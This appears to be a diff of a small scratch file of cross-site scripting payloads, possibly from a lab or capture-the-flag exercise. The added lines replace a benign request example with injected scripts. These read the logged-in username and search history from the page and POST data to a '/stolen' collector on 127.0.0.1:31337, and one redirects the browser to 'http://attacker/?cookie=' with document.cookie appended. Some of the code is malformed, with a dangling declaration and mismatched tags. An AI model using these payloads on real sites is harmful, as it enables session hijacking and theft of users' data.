@@ -17,17 +17,27 @@
 </script>
 
 http://127.0.0.1:31337/stolen?user=<username>&last_search=<last search>
-var http = new XMLHttpRequest();
-var url = "get_data.php";
-var params = "lorem=ipsum&name=binny";
-http.open("POST", url, true);
+var http
 
-//Send the proper header information along with the request
-http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 
-http.onreadystatechange = function() {//Call a function when the state changes.
-    if(http.readyState == 4 && http.status == 200) {
-        alert(http.responseText);
-    }
-}
-http.send(params);
+<script>var params = 'type=topic&action=delete&id=347';var username = document.getElementById('logged-in-user');var searchHist = document.getElementById('history-list');console.log(searchHist)</script>
+
+    var http = new XMLHttpRequest();alert(username);
+    http.open('POST', '//127.0.0.1:31337/stolen', true);
+    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    http.setRequestHeader("Content-length", params.length);
+    http.setRequestHeader("Connection", "close");
+    http.onreadystatechange = function() {
+        if(http.readyState == 4 && http.status == 200) {
+            // Do something else.
+        }
+    };
+    http.send(params);
+ </script>
+
+
+
+
+ <script>
+window.location='http://attacker/?cookie='+document.cookie
+</script>
